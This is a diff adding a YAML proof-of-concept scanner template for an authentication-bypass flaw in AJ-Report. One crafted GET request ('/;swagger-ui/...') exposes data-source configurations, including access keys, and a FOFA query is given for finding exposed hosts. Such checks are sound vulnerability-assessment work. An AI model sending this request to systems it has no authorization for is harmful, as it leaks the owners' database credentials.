@@ -1,0 +1,16 @@
+id: poc-yaml-aj-report-unauthorized-access
+info:
+  name: AJ-Report 接口绕过数据源信息泄露漏洞
+  severity: high
+  tags:
+  - 配置不当
+  finger: AJ-Report
+  fofa: title="AJ-Report"
+requests:
+- method: GET
+  path: /;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10
+  expression: "status_code == 200 && \ncontains(body,\"\\\"sourceName\\\"\") &&\n\
+    contains(body,\"\\\"sourceConfig\\\"\") &&\ncontains(body,\"\\\"accessKey\\\"\"\
+    ) &&\ncontains(headers,\"application/json\")\n"
+variables: {}
+transport: http
